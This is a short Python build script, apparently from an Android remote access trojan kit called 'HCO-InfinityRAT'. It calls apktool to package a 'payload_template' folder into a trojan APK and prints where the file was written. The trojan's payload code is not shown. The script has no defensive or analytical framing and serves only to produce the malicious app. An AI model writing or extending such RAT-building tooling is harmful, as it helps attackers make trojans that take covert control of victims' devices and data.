import os

print("[+] Building HCO-InfinityRAT APK...")

# Build the APK from the payload_template folder
os.system("apktool b payload_template -o output/HCO-InfinityRAT.apk")

print("[+] APK built successfully at: output/HCO-InfinityRAT.apk")
